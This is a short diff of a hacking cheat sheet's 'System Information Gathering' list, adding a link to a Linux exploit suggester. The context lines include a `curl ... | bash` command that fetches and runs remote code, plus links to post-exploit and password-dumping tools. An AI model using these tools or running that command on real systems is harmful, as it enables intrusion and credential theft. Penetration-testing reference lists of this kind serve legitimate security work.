@@ -2107,6 +2107,7 @@ System Information Gathering
 1. `curl -fsSL https://thc.org/ws | bash` - Show all domains hosted on a server + system-information
 1. https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS - Quick system informations for hackers.
 1. https://github.com/zMarch/Orc - Post-exploit tool to find local RCE (type `getexploit` after install)
+1. https://github.com/The-Z-Labs/linux-exploit-suggester - Suggest exploits based on versions on target system 
 1. https://github.com/efchatz/pandora - Windows: dump password from various password managers
 
 Backdoors
